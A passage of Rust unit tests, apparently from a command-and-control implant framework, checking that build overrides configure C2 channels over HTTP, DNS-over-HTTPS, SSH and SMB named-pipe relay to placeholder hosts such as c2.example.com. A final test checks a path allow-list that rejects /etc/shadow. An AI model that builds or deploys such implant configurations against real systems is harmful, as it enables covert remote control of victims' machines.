        let mut stale_config = Config::default();
        stale_config.malleable_profile.cdn_endpoint = "stale-cdn.example.com".to_string();
        stale_config.malleable_profile.ssh_host = Some("stale-ssh.example.com".to_string());
        let http = apply_build_overrides(
            stale_config,
            BuildOverrideValues {
                c2_addr: Some("c2.example.com:8446"),
                transport: Some("http"),
                ..BuildOverrideValues::default()
            },
        )
        .unwrap();
        assert!(http.malleable_profile.cdn_relay);
        assert_eq!(
            http.malleable_profile.direct_c2_endpoint,
            "http://c2.example.com:8446"
        );
        assert!(http.malleable_profile.cdn_endpoint.is_empty());
        assert!(http.malleable_profile.ssh_host.is_none());
        assert!(!http.malleable_profile.dns_over_https);

        let doh = apply_build_overrides(
            Config::default(),
            BuildOverrideValues {
                c2_addr: Some("doh.example.com:8445"),
                transport: Some("doh"),
                doh_domain: Some("tasks.example.com"),
                ..BuildOverrideValues::default()
            },
        )
        .unwrap();
        assert!(doh.malleable_profile.dns_over_https);
        assert_eq!(
            doh.malleable_profile.doh_server_url.as_deref(),
            Some("https://doh.example.com:8445/dns-query")
        );
        assert_eq!(doh.malleable_profile.host_header, "tasks.example.com");

        let ssh = apply_build_overrides(
            Config::default(),
            BuildOverrideValues {
                c2_addr: Some("ssh.example.com:2222"),
                transport: Some("ssh"),
                ssh_username: Some("operator"),
                ssh_auth_json: Some(r#"{"type":"agent"}"#),
                ..BuildOverrideValues::default()
            },
        )
        .unwrap();
        assert_eq!(
            ssh.malleable_profile.ssh_host.as_deref(),
            Some("ssh.example.com")
        );
        assert_eq!(ssh.malleable_profile.ssh_port, Some(22));
        assert_eq!(
            ssh.malleable_profile.ssh_username.as_deref(),
            Some("operator")
        );
        assert!(matches!(
            ssh.malleable_profile.ssh_auth,
            Some(SshAuthConfig::Agent)
        ));

        let smb = apply_build_overrides(
            Config::default(),
            BuildOverrideValues {
                c2_addr: Some("10.0.0.5:445"),
                transport: Some("smb"),
                smb_pipe_name: Some("orchestra"),
                smb_pipe_mode: Some("tcp_relay"),
                smb_tcp_relay_port: Some("4455"),
                ..BuildOverrideValues::default()
            },
        )
        .unwrap();
        assert!(smb.malleable_profile.smb_pipe_enabled);
        assert_eq!(
            smb.malleable_profile.smb_pipe_host.as_deref(),
            Some("10.0.0.5")
        );
        assert_eq!(
            smb.malleable_profile.smb_pipe_name.as_deref(),
            Some("orchestra")
        );
        assert_eq!(
            smb.malleable_profile.smb_pipe_mode.as_deref(),
            Some("tcp_relay")
        );
        assert_eq!(smb.malleable_profile.smb_tcp_relay_port, Some(4455));
    }

    /// Verify that path validation logic respects the allowed-paths list.
    #[test]
    fn path_validation_respects_allowed_list() {
        let cfg = Config {
            allowed_paths: vec!["/var/log".into()],
            ..Config::default()
        };
        let allowed = |p: &str| cfg.allowed_paths.iter().any(|a| p.starts_with(a.as_str()));
        assert!(allowed("/var/log/syslog"));
        assert!(!allowed("/etc/shadow"));
        assert!(!allowed("/home/user/secret"));
    }
}
